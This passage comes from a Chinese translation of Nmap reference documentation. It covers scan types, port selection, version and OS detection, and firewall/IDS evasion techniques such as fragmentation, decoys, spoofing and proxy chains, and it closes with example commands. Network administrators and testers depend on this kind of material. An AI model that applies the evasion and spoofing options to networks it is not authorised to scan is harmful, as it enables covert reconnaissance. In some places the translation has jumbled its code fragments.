URGACKPSHRSTSYNFIN</code>设置一切，尽管它对于扫描不是很有用。</p><p>除了指定所需的标志之外，您还可以指定 TCP 扫描类型（例如<code>-sA</code>或<code>-sF</code>）。该基本类型告诉 Nmap 如何解释响应。例如，SYN 扫描认为无响应来指示端口 <code>filtered</code>，而 FIN 扫描则将其视为相同 <code>open|filtered</code>。Nmap 的行为方式与基本扫描类型相同，只是它将使用您指定的 TCP 标志。如果不指定基本类型，则使用 SYN 扫描。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sZ（SCTP COOKIE ECHO 扫描）</span><br></pre></td></tr></table></figure><p>SCTP COOKIE ECHO 扫描是更高级的 SCTP 扫描。它利用了这样一个事实：SCTP 实现应该在开放端口上静默丢弃包含 COOKIE ECHO 块的数据包，但如果端口关闭则发送 ABORT。这种扫描类型的优点是端口扫描不像 INIT 扫描那么明显。此外，可能存在阻止 INIT 块的非状态防火墙规则集，但不阻止 COOKIE ECHO 块。不要误以为这会使端口扫描不可见；好的 IDS 也能够检测 SCTP COOKIE ECHO 扫描。缺点是 SCTP COOKIE ECHO 扫描无法区分<code>open</code>和端口，因此您只能了解 两种情况下的<code>filtered</code> 状态。<code>open|filtered</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sI *&lt;zombie host&gt;*[:*&lt;probeport&gt;*]（空闲扫描）</span><br></pre></td></tr></table></figure><p>这种先进的扫描方法允许对目标进行真正的盲 TCP 端口扫描（<strong>意味着不会从您的真实 IP 地址向目标发送任何数据包</strong>）。相反，独特的旁路攻击利用僵尸主机上可预测的 IP 碎片 ID 序列生成来收集有关目标上开放端口的信息。IDS 系统会将扫描显示为来自您指定的僵尸计算机（该计算机必须启动并满足特定条件）。</p><p>除了非常隐蔽（由于其盲目性）之外，这种扫描类型还允许映射机器之间基于 IP 的信任关系。端口列表 从僵尸主机的角度显示开放端口。因此，您可以尝试使用您认为可能可信的各种僵尸来扫描目标 （通过路由器&#x2F;数据包过滤规则）。如果您希望探测僵尸主机上的特定端口以获取 IP ID 更改，则可以向僵尸主机添加一个冒号，后跟端口号。否则，Nmap 将使用默认情况下用于 TCP ping 的端口 (80)。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sO（IP协议扫描）</span><br></pre></td></tr></table></figure><p>IP 协议扫描允许您确定目标计算机支持哪些 IP 协议（TCP、ICMP、IGMP 等）。从技术上讲，这不是端口扫描，因为它循环遍历 IP 协议号而不是 TCP 或 UDP 端口号。然而，它仍然使用该 <code>-p</code>选项来选择扫描的协议号，以正常的端口表格式报告其结果，甚至使用与真正的端口扫描方法相同的底层扫描引擎。因此它与端口扫描足够接近，因此属于此处。</p><p>除了本身有用之外，协议扫描还展示了开源软件的强大功能。协议扫描的工作方式与 UDP 扫描类似。它不是遍历 UDP 数据包的端口号字段，而是发送 IP 数据包标头并遍历 8 位 IP 协议字段。标头通常是空的，不包含任何数据，甚至不包含所声明协议的正确标头。TCP、UDP、ICMP、SCTP 和 IGMP 除外。包含了这些协议的正确协议头，因为某些系统不会以其他方式发送它们，而且 Nmap 已经具有创建它们的函数。协议扫描不是监视 ICMP 端口不可达消息，而是查找 ICMP 协议不可达消息。如果 Nmap 从目标主机接收到任何协议的任何响应，Nmap 将该协议标记为<code>open</code>。ICMP 协议不可达错误导致协议被标记为<code>closed</code>，而端口不可达则将该协议标记为<code>open</code>。其他 ICMP 不可达错误会导致协议被标记为<code>open</code>，如果重传后没有收到响应，则协议被标记 <code>open|filtered</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-b *&lt;FTP relay host&gt;*（FTP 反弹扫描）</span><br></pre></td></tr></table></figure><p>FTP 协议的一个有趣功能是支持所谓的代理 FTP 连接。这允许用户连接到一台 FTP 服务器，然后要求将文件发送到第三方服务器。这样的功能在很多层面上都容易被滥用，因此大多数服务器已经停止支持它。此功能允许的滥用行为之一是导致 FTP 服务器对其他主机进行端口扫描。只需要求 FTP 服务器依次将文件发送到目标主机的每个感兴趣的端口即可。错误消息将描述端口是否打开。这是绕过防火墙的好方法，因为组织 FTP 服务器通常放置在比任何旧 Internet 主机更能访问其他内部主机的位置。</p><p>Nmap 通过选项支持 FTP 反弹扫描<code>-b</code>。它需要以下形式的参数 <em><code>&lt;username&gt;</code><em>：</em><code>&lt;password&gt;</code></em>@ <em><code>&lt;server&gt;</code><em>：。</em><code>&lt;port&gt;</code></em>_ *<code>&lt;Server&gt;</code>*是易受攻击的 FTP 服务器的名称或 IP 地址。与普通 URL 一样，您可以省略 <em><code>&lt;username&gt;</code></em>: *<code>&lt;password&gt;</code>*，在这种情况下 将使用匿名登录凭据（用户：<code>anonymous</code>密码：） 。<code>-wwwuser@</code>端口号（以及前面的冒号）也可以省略，在这种情况下， *<code>&lt;server&gt;</code>*将使用默认的 FTP 端口 (21)。</p><h3 id="端口规格和扫描顺序"><a href="#端口规格和扫描顺序" class="headerlink" title="端口规格和扫描顺序"></a>端口规格和扫描顺序</h3><p>Nmap 提供用于指定扫描哪些端口以及扫描顺序是随机还是顺序的选项。默认情况下，Nmap 扫描每个协议最常见的 1,000 个端口。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p *&lt;port ranges&gt;*（只扫描指定端口）</span><br></pre></td></tr></table></figure><p>此选项指定您要扫描的端口并覆盖默认值。</p><p>例如，该参数<code>-p U:53,111,137,T:21-25,80,139,8080</code>将扫描 UDP 端口 53、111 和 137，以及列出的 TCP 端口。</p><p>请注意，要扫描 UDP 和 TCP，您必须指定 <code>-sU</code>至少一种 TCP 扫描类型（例如 <code>-sS</code>、<code>-sF</code>或 <code>-sT</code>）。如果未给出协议限定符，则端口号将添加到所有协议列表中。</p><p>端口也可以根据端口在<code>nmap-services</code>。您甚至可以将通配符<code>*</code>和 <code>?</code>与名称一起使用。例如，要扫描 FTP 以及名称以“ http ”开头的所有端口，请使用<code>-p ftp,http*</code>。端口范围可以用方括号括起来，以指示出现在该范围内的端口<code>nmap-services</code>。例如，以下命令将扫描<code>nmap-services</code> 等于或小于 1024 的所有端口：<code>-p [-1024]</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--exclude-ports *&lt;port ranges&gt;*（从扫描中排除指定端口）</span><br></pre></td></tr></table></figure><p>此选项指定您希望 Nmap 从扫描中排除哪些端口。它们*<code>&lt;port ranges&gt;</code>* 的指定类似于<code>-p</code>. 对于 IP 协议扫描 ( <code>-sO</code>)，此选项指定您希望排除的协议号 (0–255)。当要求排除端口时，它们将从所有类型的扫描中排除（即在任何情况下都不会被扫描）。这也包括发现阶段。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-F（快速（有限端口）扫描）</span><br></pre></td></tr></table></figure><p>指定您希望扫描比默认端口少的端口。通常，Nmap 会为每个扫描协议扫描最常见的 1,000 个端口。使用 时<code>-F</code>，该值减少至 100。Nmap 需要一个<code>nmap-services</code>包含频率信息的文件，以便了解哪些端口最常见。如果端口频率信息不可用，可能是因为使用了自定义<code>nmap-services</code>文件，Nmap 会扫描所有命名端口以及端口 1-1024。在这种情况下， <code>-F</code>意味着仅扫描服务文件中指定的端口。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-r（不要随机化端口）</span><br></pre></td></tr></table></figure><p>默认情况下，Nmap 随机化扫描的端口顺序（出于效率原因，某些常用端口被移动到开头附近）。这种随机化通常是可取的，但您可以指定 <code>-r</code>顺序（从最低到最高排序）端口扫描。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--port-ratio *&lt;ratio&gt;*&lt;decimal number between 0 and 1&gt;</span><br></pre></td></tr></table></figure><p><code>nmap-services</code>以大于给定的比率扫描文件中的所有端口。*<code>&lt;ratio&gt;</code>*必须介于 0.0 和 1.0 之间。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--top-ports *&lt;n&gt;*</span><br></pre></td></tr></table></figure><p>排除 指定的所有端口后，扫描文件*<code>&lt;n&gt;</code><em>中找到的最高比率端口。 必须为 1 或更大。<code>nmap-services``--exclude-ports</code></em><code>&lt;n&gt;</code>*</p><h3 id="服务和版本探测"><a href="#服务和版本探测" class="headerlink" title="服务和版本探测"></a>服务和版本探测</h3><p>将 Nmap 指向远程计算机，它可能会告诉您端口<code>25/tcp</code>、<code>80/tcp</code>和<code>53/udp</code>已打开。</p><p>使用其他扫描方法之一发现 TCP 和&#x2F;或 UDP 端口后，版本检测会询问这些端口以确定有关实际运行情况的更多信息。这 <code>nmap-service-probes</code> 数据库包含用于查询各种服务的探针和匹配表达式以识别和解析响应。</p><p>Nmap 尝试确定<strong>服务协议</strong>（例如 FTP、SSH、Telnet、HTTP）、<strong>应用程序名称</strong>（例如 ISC BIND、Apache httpd、Solaris telnetd）、版本号、主机名、设备类型（例如打印机、路由器）、操作系统系列（例如 Windows、Linux）。如果可能，Nmap 还会获取通用平台枚举 (CPE) 该信息的表示。有时，可以使用其他详细信息，例如 X 服务器是否对连接开放、SSH 协议版本或 KaZaA 用户名。当然，大多数服务并不提供所有这些信息。</p><p><strong>如果 Nmap 是使用 OpenSSL 支持编译的，它将连接到 SSL 服务器以推断该加密层后面的服务侦听。</strong></p><p><code>open|filtered</code>某些 UDP 端口在 UDP 端口扫描无法确定端口是开放还是已过滤后仍处于该状态。版本检测将尝试从这些端口引发响应（就像对开放端口所做的那样），如果成功，则将状态更改为开放。<code>open|filtered</code>TCP 端口的处理方式相同。请注意，Nmap<code>-A</code>选项可启用版本检测等功能。</p><p><strong>使用以下选项启用和控制版本检测：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sV（版本检测）</span><br></pre></td></tr></table></figure><p>启用版本检测，或者使用<code>-A</code>，它可以启用版本检测等功能。<code>-sR</code> 是 的别名<code>-sV</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--allports（不要从版本检测中排除任何端口）</span><br></pre></td></tr></table></figure><p>默认情况下，Nmap 版本检测会跳过 TCP 端口 9100，因为某些打印机只是打印发送到该端口的任何内容，从而导致数十页 HTTP GET 请求、二进制 SSL 会话请求等。可以通过修改或删除中的指令来更改此<code>Exclude</code> 行为<code>nmap-service-probes</code>，或者您可以指定<code>--allports</code>扫描所有端口，而不考虑任何<code>Exclude</code> 指令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--version-intensity *&lt;intensity&gt;*（设置版本扫描强度）</span><br></pre></td></tr></table></figure><p>当执行版本扫描 ( <code>-sV</code>) 时，Nmap 发送一系列探测，每个探测都分配有一个 1 到 9 之间的稀有值。编号较低的探测器对多种常见服务有效，而编号较高的探测器则很少有用。强度级别指定应应用哪些探针。数字越高，服务被正确识别的可能性就越大。然而，高强度扫描需要更长的时间。强度必须介于 0 和 9 之间。 默认值为 7。 当探头通过 <code>nmap-service-probes</code> <code>ports</code>指令，无论强度水平如何，都会尝试该探针。这可确保始终针对任何开放端口 53 尝试 DNS 探测，针对 443 等进行 SSL 探测。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--version-light（启用灯光模式）</span><br></pre></td></tr></table></figure><p>这是 的方便别名 <code>--version-intensity 2</code>。这种轻型模式使版本扫描速度更快，但识别服务的可能性稍低。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--version-all（尝试每个探针）</span><br></pre></td></tr></table></figure><p>确保针对每个端口尝试每个探测。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--version-trace（跟踪版本扫描活动）</span><br></pre></td></tr></table></figure><p>这会导致 Nmap 打印出有关版本扫描正在执行的操作的大量调试信息。它是您所获得的内容的子集<code>--packet-trace</code>。</p><h3 id="操作系统检测"><a href="#操作系统检测" class="headerlink" title="操作系统检测"></a>操作系统检测</h3><p><strong>Nmap 最著名的功能之一是使用 TCP&#x2F;IP 堆栈指纹进行远程操作系统检测。</strong></p><p>Nmap 向远程主机发送一系列 TCP 和 UDP 数据包，并检查响应中的几乎每一位。在执行了数十项测试（例如 TCP ISN 采样、TCP 选项支持和排序、IP ID 采样以及初始窗口大小检查）后，Nmap 将结果与它的结果进行比较 <code>nmap-os-db</code> 数据库包含 2,600 多个已知操作系统指纹，如果匹配则打印出操作系统详细信息。每个指纹包括操作系统的自由形式文本描述，以及提供供应商名称（例如 Sun）、底层操作系统（例如 Solaris）、操作系统代（例如 10）和设备类型（通用、路由器、交换机、游戏）的分类。控制台等）。大多数指纹还具有通用平台枚举 (CPE) 表示，如 <code>cpe:/o:linux:linux_kernel:2.6</code>.</p><p>如果Nmap无法猜测一台机器的操作系统，并且条件良好（例如至少找到一个开放端口和一个关闭端口），Nmap将提供一个URL，您可以使用该URL来提交指纹机器上运行的操作系统。</p><p>操作系统检测启用了一些其他测试，这些测试无论如何都会利用在该过程中收集的信息。其中之一是 TCP 序列可预测性分类。该值大致衡量针对远程主机建立伪造 TCP 连接的难度。它对于利用基于源 IP 的信任关系（rlogin、防火墙过滤器等）或隐藏攻击源非常有用。</p><p>操作系统检测提供的另一点额外信息是对目标正常运行时间的猜测。这使用 TCP 时间戳选项来猜测计算机上次重新启动的时间。由于时间戳计数器未初始化为零或计数器溢出并回绕，猜测可能不准确，因此仅以详细模式打印。</p><p><strong>操作系统检测通过以下选项启用和控制：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-O（启用操作系统检测）</span><br></pre></td></tr></table></figure><p>启用操作系统检测。或者，您可以用来<code>-A</code>启用操作系统检测以及其他功能。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--osscan-limit（将操作系统检测限制在有希望的目标）</span><br></pre></td></tr></table></figure><p>如果至少找到一个打开和一个关闭的 TCP 端口，操作系统检测会更加有效。设置此选项，Nmap 甚至不会尝试对不满足此条件的主机进行操作系统检测。这可以节省大量时间，特别是在<code>-Pn</code>扫描许多主机时。<code>-O</code>仅当使用或请求操作系统检测时才重要<code>-A</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--osscan-guess; --fuzzy（猜测操作系统检测结果）</span><br></pre></td></tr></table></figure><p>当 Nmap 无法检测到完美的操作系统匹配时，它有时会提供近似匹配的可能性。而且必须非常接近，Nmap 才能默认执行此操作。这些（等效）选项中的任何一个都会使 Nmap 猜测更积极。Nmap 仍然会在打印不完美匹配时告诉您，并显示每个猜测的置信度（百分比）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--max-os-tries（设置针对目标的操作系统检测尝试的最大次数）</span><br></pre></td></tr></table></figure><p>当 Nmap 对目标执行操作系统检测但未能找到完美匹配时，它通常会重复尝试。默认情况下，如果条件有利于操作系统指纹提交，Nmap 会尝试五次，如果条件不太好，Nmap 会尝试两次。指定较低的 <code>--max-os-tries</code>值（例如 1）会加快 Nmap 的速度，但您会错过可能识别操作系统的重试。或者，可以设置较高的值，以便在条件有利时允许更多的重试。除了生成更好的指纹以提交并集成到 Nmap OS 数据库中之外，很少这样做。</p><h3 id="防火墙-IDS绕过"><a href="#防火墙-IDS绕过" class="headerlink" title="防火墙&#x2F;IDS绕过"></a>防火墙&#x2F;IDS绕过</h3><p>20 世纪 90 年代初，防火墙开始被部署，其明确目的是减少网络连接。其应用代理、网络地址转换和数据包过滤器将庞大的网络与未经过滤的互联网隔离开来。</p><p>除了限制网络活动之外，很多公司或组织还使用入侵检测系统 (IDS) 来监控流量。所有主要 IDS 都附带了旨在检测 Nmap 扫描的规则。但是，对于网络管理员和 IDS 供应商来说，通过分析数据包数据有效地检测恶意意图是一个难题。这时，有些 Nmap 选项可以帮助攻击者绕过 IDS。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f（分片数据包）； --mtu（使用指定的MTU）</span><br></pre></td></tr></table></figure><p>这<code>-f</code>选项导致请求的扫描（包括主机发现扫描）使用微小的碎片 IP 数据包。这个想法是将 TCP 标头拆分为多个数据包，以使数据包过滤器、入侵检测系统和其他干扰更难检测到您正在做的事情。</p><p>指定此选项一次，Nmap 将在 IP 标头之后将数据包分割成 8 个或更少的字节。因此 20 字节的 TCP 标头将被分成三个数据包。两个包含 TCP 标头的八个字节，另一个包含最后四个字节。当然每个片段也有一个IP头。指定<code>-f</code>再次使用每个片段 16 字节（减少片段数量）。 或者您可以使用该<code>--mtu</code>选项指定您自己的偏移大小。也不要指定<code>-f</code>是否使用<code>--mtu</code>. 偏移量必须是八的倍数。虽然分段数据包不会通过对所有 IP 分段进行排队的数据包过滤器和防火墙（例如<code>CONFIG_IP_ALWAYS_DEFRAG</code>Linux 内核中的选项），但某些网络无法承受由此造成的性能损失，因此将其禁用。其他人无法启用此功能，因为片段可能采用不同的路由进入其网络。</p><p>一些源系统在内核中对传出数据包进行碎片整理。Linux 与 iptables 连接跟踪模块就是这样的一个例子。在Wireshark等嗅探器运行时进行扫描 ，以确保发送的数据包是分段的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-D *&lt;decoy1&gt;*[,*&lt;decoy2&gt;*][,ME][,...] （用诱饵掩盖扫描）</span><br></pre></td></tr></table></figure><p>执行诱饵扫描使得远程主机看起来您指定为诱饵的主机也在扫描目标网络。因此，他们的 IDS 可能会报告来自唯一 IP 地址的 5-10 个端口扫描，但他们不知道哪个 IP 正在扫描它们以及哪些是无辜的诱饵。</p><p>虽然可以通过路由器路径跟踪、响应丢弃和其他主动机制来克服这种情况，但它通常是隐藏 IP 地址的有效技术。</p><p>用逗号分隔每个诱饵主机，您可以选择用作 <code>ME</code> 诱饵之一来表示您的真实 IP 地址的位置。如果你放在 <code>ME</code>第六个或更高的位置，一些常见的端口扫描检测器（例如 Solar Designer 优秀的 Scanlogd） 根本不可能显示你的 IP 地址。如果你不使用<code>ME</code>，Nmap 会将你置于随机位置。您还可以使用它 <code>RND</code> 来生成随机的、非保留的 IP 地址，或者生成地址。<code>RND:*</code><number><code>*</code>*<code>&lt;number&gt;</code>*请注意，用作诱饵的主机应该处于启动状态，否则您可能会意外地对目标进行 SYN 淹没。此外，如果网络上实际上只有一台主机，则可以很容易地确定哪台主机正在扫描。您可能希望使用 IP 地址而不是名称（这样诱饵网络就不会在其名称服务器日志中看到您）。目前仅 IPv4 支持随机 IP 地址生成诱饵在初始主机发现扫描（使用 ICMP、SYN、ACK 或其他）和实际端口扫描阶段都使用。在远程操作系统检测期间也会使用诱饵 ( <code>-O</code>)。诱饵不能与版本检测或 TCP 连接扫描一起使用。当扫描延迟生效时，延迟会在每批欺骗探针之间强制执行，而不是在每个单独的探针之间强制执行。由于诱饵是一次性批量发送的，因此它们可能会暂时违反拥塞控制限制。</p><p>值得注意的是，使用太多诱饵可能会减慢扫描速度，甚至可能降低扫描的准确性。此外，一些 ISP 会过滤掉您的欺骗性数据包，但许多 ISP 根本不限制欺骗性 IP 数据包。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-S *&lt;IP_Address&gt;*（欺骗源地址）</span><br></pre></td></tr></table></figure><p>在某些情况下，Nmap 可能无法确定您的源地址。在这种情况下，请使用<code>-S</code>您希望通过其发送数据包的接口的 IP 地址。该标志的另一种可能用途是欺骗扫描，使目标认为<em>其他人</em>正在扫描它们。此类用途通常需要选项 <code>-e</code>和。<code>-Pn</code>请注意，您通常不会收到回复数据包（它们将被发送到您正在欺骗的 IP），因此 Nmap 不会生成有用的报告。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-e *&lt;interface&gt;*（使用指定接口）</span><br></pre></td></tr></table></figure><p>告诉 Nmap 在哪个接口上发送和接收数据包。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--source-port *&lt;portnumber&gt;*; -g *&lt;portnumber&gt;*（欺骗源端口号）</span><br></pre></td></tr></table></figure><p>一种常见错误配置是仅根据源端口号来信任流量。这种情况下DNS 可能会被破坏，因为来自外部服务器的 UDP DNS 回复无法再进入网络。</p><p>FTP 是另一个常见的例子。在主动 FTP 传输中，远程服务器尝试建立回客户端的连接以传输请求的文件。这些问题的安全解决方案通常以应用程序级代理或协议解析防火墙模块的形式存在。</p><p>注意到 DNS 回复来自端口 53，活动 FTP 来自端口 20，许多管理员陷入了简单地允许来自这些端口的传入流量的陷阱。他们通常假设没有攻击者会注意到并利用此类防火墙漏洞。在其他情况下，管理员认为这是一个短期的权宜之计，直到他们可以实施更安全的解决方案。然后他们忘记了安全升级。过度劳累的网络管理员并不是唯一陷入这个陷阱的人。</p><p>许多产品都附带了这些不安全的规则。Windows 2000 和 Windows XP 附带的 IPsec 筛选器包含一条隐式规则，允许来自端口 88 (Kerberos) 的所有 TCP 或 UDP 流量。</p><p>在另一个众所周知的案例中，Zone Alarm 个人防火墙版本高达 2.1.25 允许任何源端口为 53 (DNS) 或 67 (DHCP) 的传入 UDP 数据包。</p><p>Nmap 提供了<code>-g</code>和 <code>--source-port</code>选项（它们是等效的）来利用这些弱点。只需提供一个端口号，Nmap 就会在可能的情况下从该端口发送数据包。大多数使用原始套接字的扫描操作（包括 SYN 和 UDP 扫描）完全支持该选项。值得注意的是，该选项对于使用正常操作系统套接字的任何操作都没有影响，包括 DNS 请求、TCP<code>connect</code> 扫描、版本检测和脚本扫描。设置源端口对于操作系统检测也不起作用，因为 Nmap 必须使用不同的端口号才能使某些操作系统检测测试正常工作。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--data *&lt;hex string&gt;*（将自定义二进制数据附加到发送的数据包）</span><br></pre></td></tr></table></figure><p>此选项允许您将二进制数据作为有效负载包含在发送的数据包中。 *<code>&lt;hex string&gt;</code>*可以用以下任意格式指定：、 或 . 使用示例是和 。请注意，如果您指定一个数字，则 不会执行字节顺序转换。确保按照接收者期望的字节顺序指定信息。 <code>0xAABBCCDDEEFF*</code>&lt;…&gt;<code>*``AABBCCDDEEFF*</code>&lt;…&gt;<code>*``\xAA\xBB\xCC\xDD\xEE\xFF*</code>&lt;…&gt;<code>*``--data 0xdeadbeef``--data \xCA\xFE\x09``0x00ff</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--data-string *&lt;string&gt;*（将自定义字符串附加到发送的数据包）</span><br></pre></td></tr></table></figure><p>此选项允许您在发送的数据包中包含常规字符串作为有效负载。*<code>&lt;string&gt;</code>*可以包含任何字符串。但是，请注意，某些字符可能取决于系统的区域设置，并且接收者可能看不到相同的信息。另外，请确保将字符串括在双引号中，并从 shell 中转义任何特殊字符。示例：<code>--data-string &quot;Scan conducted by Security Ops, extension 7192&quot;</code> 或<code>--data-string &quot;Ph34r my l33t skills&quot;</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--data-length *&lt;number&gt;*（将随机数据附加到发送的数据包中）</span><br></pre></td></tr></table></figure><p>通常，Nmap 发送仅包含标头的极简数据包。因此它的 TCP 数据包通常为 40 个字节，而 ICMP 回显请求仅为 28 个字节。某些 UDP 端口 和 IP 协议 默认情况下会获取自定义负载。此选项告诉 Nmap 将给定数量的随机字节附加到其发送的大多数数据包中，并且不使用任何特定于协议的有效负载。（<code>--data-length 0</code> 不用于随机或特定于协议的有效负载。 操作系统检测 ( <code>-O</code>) 数据包不受影响，因为那里的准确性需要探测一致性，但大多数 ping 和 portscan 数据包都支持这一点。它会稍微减慢速度，但可以使扫描稍微不那么明显。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--ip-options *&lt;R|S [route]|L [route]|T|U ... &gt;*; --ip-options *&lt;hex string&gt;* （发送带有指定ip选项的数据包）</span><br></pre></td></tr></table></figure><p>IP协议提供了多个可以放置在数据包标头中的选项。与无处不在的 TCP 选项不同，出于实用性和安全性考虑，IP 选项很少见。事实上，许多互联网路由器会阻止最危险的选项，例如源路由。然而，在某些情况下，选项对于确定和操作到目标计算机的网络路由仍然有用。例如，即使更传统的跟踪路由式方法失败，您也可以使用记录路由选项来确定到目标的路径。或者，如果您的数据包被某个防火墙丢弃，您可以使用严格或松散源路由选项指定不同的路由。指定 IP 选项的最强大方法是简单地将值作为参数传递给 <code>--ip-options</code>. 在每个十六进制数字 <code>\x</code>前面加上两位数字。您可以重复某些字符，方法是在它们后面加上星号，然后输入您希望它们重复的次数。例如， <code>\x01\x07\x04\x00*36\x01</code>是包含 36 NUL 字节的十六进制字符串。Nmap 还提供了指定选项的快捷方式机制。只需传递字母<code>R</code>、 <code>T</code>、 或即可<code>U</code>分别请求记录路由、 记录时间戳 或同时请求这两个选项。松散或严格的源路由可以用或后跟一个空格，然后是空格分隔的 IP 地址列表来 指定。<code>L``S</code>如果您希望查看发送和接收的数据包中的选项，请指定<code>--packet-trace</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--ttl *&lt;value&gt;*（设置IP生存时间字段）</span><br></pre></td></tr></table></figure><p>将发送数据包中的 IPv4 生存时间字段设置为给定值。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--randomize-hosts（随机化目标主机顺序）</span><br></pre></td></tr></table></figure><p>告诉 Nmap 在扫描每组最多 16384 个主机之前对它们进行打乱。这可以使扫描对于各种网络监控系统来说不太明显，特别是当您将其与慢速计时选项结合使用时。如果您想随机分配更大的组大小，请增加 <code>PING_GROUP_SZ</code> 并<code>nmap.h</code> 重新编译。另一种解决方案是使用列表扫描 ( ) 生成目标 IP 列表，使用 Perl 脚本对其进行随机化，然后使用 向 Nmap 提供整个列表 。<code>-sL -n -oN *</code><filename><code>*``-iL</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--spoof-mac *&lt;MAC address, prefix, or vendor name&gt;*（欺骗MAC地址）</span><br></pre></td></tr></table></figure><p>要求 Nmap对它发送的所有原始以太网帧<code>--send-eth</code>使用给定的 MAC 地址 。此选项意味着 确保 Nmap 实际发送以太网级数据包。给出的 MAC 可以采用多种格式。如果只是数字<code>0</code>，Nmap 会为会话选择一个完全随机的 MAC 地址。如果给定的字符串是偶数个十六进制数字（各对可选地用冒号分隔），Nmap 将使用它们作为 MAC。如果提供的十六进制数字少于 12 个，Nmap 将使用随机值填充剩余的 6 个字节。如果参数不是零或十六进制字符串，Nmap 会查找 <code>nmap-mac-prefixes</code>包含给定字符串的供应商名称（不区分大小写）。如果找到匹配项，Nmap 将使用供应商的 OUI（三字节前缀） 并随机填充剩余的三个字节。有效<code>--spoof-mac</code>参数示例为<code>Apple</code>、<code>0</code>、 <code>01:02:03:04:05:06</code>、<code>deadbeefcafe</code>、<code>0020F2</code>和<code>Cisco</code>。此选项仅影响原始数据包扫描，例如 SYN 扫描或操作系统检测，而不影响面向连接的功能，例如版本检测或 Nmap 脚本引擎。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--proxies *&lt;Comma-separated list of proxy URLs&gt;*（通过代理链中继 TCP 连接）</span><br></pre></td></tr></table></figure><p>要求 Nmap 通过提供的一个或多个 HTTP 或 SOCKS4 代理链与最终目标建立 TCP 连接。代理可以帮助隐藏扫描的真实来源或规避某些防火墙限制，但它们可能会增加延迟，从而影响扫描性能。用户可能需要相应地调整 Nmap 超时和其他扫描参数。特别是，较低的值<code>--max-parallelism</code>可能会有所帮助，因为某些代理拒绝处理 Nmap 默认打开的并发连接数。此选项采用代理列表作为参数，以 URL 格式表示<code>proto://host:port</code>。使用逗号分隔链中的节点 URL。尚不支持身份验证。有效协议是<code>HTTP</code>和<code>SOCKS4</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--badsum（发送带有伪造 TCP/UDP 校验和的数据包）</span><br></pre></td></tr></table></figure><p>要求 Nmap 对发送到目标主机的数据包使用无效的 TCP、UDP 或 SCTP 校验和。由于几乎所有主机 IP 堆栈都会正确丢弃这些数据包，因此收到的任何响应都可能来自防火墙或 IDS，它们不会验证校验和。</p><h3 id="一些例子"><a href="#一些例子" class="headerlink" title="一些例子"></a>一些例子</h3><p><strong>nmap -v scanme.nmap.org</strong></p><p>该选项扫描机器上所有保留的 TCP 端口 <code>scanme.nmap.org</code>。该<code>-v</code> 选项启用详细模式。</p><p><strong>nmap -sS -O scanme.nmap.org&#x2F;24</strong></p><p>对 Scanme 所在的 &#x2F;24 大小的网络上 256 个 IP 范围内的每台计算机启动秘密 SYN 扫描。它还尝试确定每台已启动并正在运行的主机上正在运行什么操作系统。由于 SYN 扫描和操作系统检测，这需要 root 权限。</p><p><strong>nmap -sV -p 22,53,110,143,4564 198.116.0-255.1-127</strong></p><p>在 198.116.0.0&#x2F;16 地址空间中 255 个可能的 8 位子网中每个子网的前半部分启动主机枚举和 TCP 扫描。这会测试系统是否在其标准端口或端口 4564 上运行 SSH、DNS、POP3 或 IMAP。对于发现打开的任何这些端口，版本检测用于确定正在运行的应用程序。</p><p><strong>nmap -v -iR 100000 -Pn -p 80</strong></p><p>要求 Nmap 随机选择 100,000 个主机并扫描它们的 Web 服务器（端口 80）。主机枚举被禁用， <code>-Pn</code>因为当您只探测每个目标主机上的一个端口时，首先发送几个探测来确定主机是否已启动是浪费。</p><p><strong>nmap -Pn -p80 -oX 日志&#x2F;pb-port80scan.xml -oG 日志&#x2F;pb-port80scan.gnmap 216.163.128.20&#x2F;20</strong></p><p>这会扫描 4096 个 IP 中的任何 Web 服务器（无需对它们执行 ping 操作），并将输出保存为 grepable 和 XML 格式。</p><h2 id="nmap的原理"><a href="#nmap的原理" class="headerlink" title="nmap的原理"></a>nmap的原理</h2><p>通过上述对nmap强大功能的学习，可以总结出nmap的运行原理即是基于不同的目的，选取不同的选项，发送不同的数据包，返回不同的结果。</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" 